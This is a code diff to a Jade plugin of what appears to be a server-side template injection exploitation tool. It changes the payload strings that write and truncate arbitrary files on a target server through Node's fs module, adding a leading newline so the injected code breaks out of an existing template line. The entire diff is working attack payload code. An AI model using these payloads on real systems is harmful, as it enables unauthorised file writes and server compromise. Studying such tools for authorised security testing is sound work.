@@ -19,8 +19,9 @@ class Jade(Plugin):
         # No evaluate_blind here, since we've no sleep, we'll use inject
         'write' : {
             'call' : 'inject',
-            'write' : """- global.process.mainModule.require('fs').appendFileSync('%(path)s', Buffer('%(chunk_b64)s', 'base64'), 'binary')""",
-            'truncate' : """- global.process.mainModule.require('fs').writeFileSync('%(path)s', '')"""
+            # All the payloads with inject should have a starting \n to escape already started Jade lines
+            'write' : """\n- global.process.mainModule.require('fs').appendFileSync('%(path)s', Buffer('%(chunk_b64)s', 'base64'), 'binary')""",
+            'truncate' : """\n- global.process.mainModule.require('fs').writeFileSync('%(path)s', '')"""
         },
         'read' : {
             'call': 'render',
